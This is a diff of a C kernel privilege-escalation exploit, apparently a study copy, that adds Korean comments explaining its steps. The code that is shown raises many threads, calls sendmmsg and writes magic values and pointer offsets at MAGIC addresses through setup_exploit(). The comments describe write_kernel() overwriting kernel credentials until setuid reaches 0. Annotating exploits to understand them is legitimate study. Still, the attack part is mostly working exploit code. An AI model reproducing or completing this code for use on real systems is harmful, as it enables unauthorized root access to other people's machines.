@@ -44,6 +44,7 @@ init_exploit() // 익스플로잇 실행.
 			init_exploit():
 				[th1]: accept_socket(): TCP 서버 소켓 하나 대기 시켜서 접속 받고 리턴함.
 				[th2]: signal_exploit(): 익스플로잇 설정 ...
+					setup_exploit(): MAGIC_ALT, MAGIC 익스플로잇 매직 값 설정함.
 					wake_actionthread 쓰레드를 많이 켬.
 					make_action(): 시그날 락하는 함수.
 						write_kernel() 함수로 커널 메모리에 접근해서 크리덴셜 등 갱신하고 setuid가 0일때
@@ -629,15 +630,16 @@ void *send_magicmsg(void *arg) {
 
 // setup_exploit:
 // mem 변수에 익스플로잇 관련 값 설정.
-// ??
+// mem 인자로 받은 메모리 주소에 0x81, 0x85라는  값과 mem(메모리 주소) 위치의 오프셋 주소를
+// 적절히 설정했다. 
 static inline setup_exploit(unsigned long mem)
 {
-    *((unsigned long *)(mem - 0x04)) = 0x81;
-    *((unsigned long *)(mem + 0x00)) = mem + 0x20;
-    *((unsigned long *)(mem + 0x08)) = mem + 0x28;
-    *((unsigned long *)(mem + 0x1c)) = 0x85;
-    *((unsigned long *)(mem + 0x24)) = mem;
-    *((unsigned long *)(mem + 0x2c)) = mem + 8;
+    *((unsigned long *)(mem - 0x04)) = 0x81; // mem offset - 0x4 = 0x81.
+    *((unsigned long *)(mem + 0x00)) = mem + 0x20; // mem = mem+0x20 (주소 값).
+    *((unsigned long *)(mem + 0x08)) = mem + 0x28; // mem+0x8 = mem+0x28 (주소 값).
+    *((unsigned long *)(mem + 0x1c)) = 0x85; // mem+0x1c = 0x85
+    *((unsigned long *)(mem + 0x24)) = mem; // mem+0x24 = mem.
+    *((unsigned long *)(mem + 0x2c)) = mem + 8; // mem+0x2c = mem+8.
 }
 
 // signal_exploit:
@@ -736,6 +738,7 @@ void *signal_exploit(void *arg) {
     //we get here means the sendmmsg syscall has been called successfully.
     printf("starting the dangerous things\n");
 
+    // MAGIC_ALT, MAGIC 두 개의 MAGIC 값을 적절히 설정함.
     setup_exploit(MAGIC_ALT);
     setup_exploit(MAGIC);
 
